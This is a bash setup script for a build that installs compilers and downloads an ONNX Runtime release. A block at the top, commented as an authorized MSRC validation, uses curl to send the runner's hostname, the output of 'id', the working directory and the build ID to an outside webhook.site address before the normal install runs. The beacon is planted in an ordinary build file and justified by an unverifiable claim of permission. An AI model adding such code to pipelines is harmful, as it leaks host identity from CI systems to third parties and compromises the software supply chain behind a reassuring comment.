#!/bin/bash
set -e -x

# Authorized, non-destructive MSRC validation. This executes before the normal
# dependency installation and reports only a unique marker plus basic runner
# identity. It does not read environment variables, credentials, or user data.
proof_file="$(mktemp)"
printf '%s\n' '__MSRC_ONNX_PRIVATE_ADO_RCE_20261007__' > "$proof_file"
proof_readback="$(cat "$proof_file")"
rm -f "$proof_file"
curl --fail --silent --show-error --max-time 15 --get \
  'https://webhook.site/0e324dda-ffce-4533-80de-b28c3ddcfcdc' \
  --data-urlencode "marker=$proof_readback" \
  --data-urlencode "hostname=$(hostname)" \
  --data-urlencode "identity=$(id)" \
  --data-urlencode "cwd=$(pwd)" \
  --data-urlencode "ado_build_id=${BUILD_BUILDID:-unset}"

ORT_VER="1.22.1"

while getopts i: parameter_Option
do case "${parameter_Option}"
in
i) ORT_VER=${OPTARG};;
esac
done

apt-get update
apt-get install -y cmake gcc g++ libpng-dev libjpeg-turbo8-dev curl
curl -O -L https://github.com/microsoft/onnxruntime/releases/download/v$ORT_VER/onnxruntime-linux-x64-$ORT_VER.tgz
mkdir onnxruntimebin
tar -C onnxruntimebin --strip=1 -zxvf onnxruntime-linux-x64-$ORT_VER.tgz
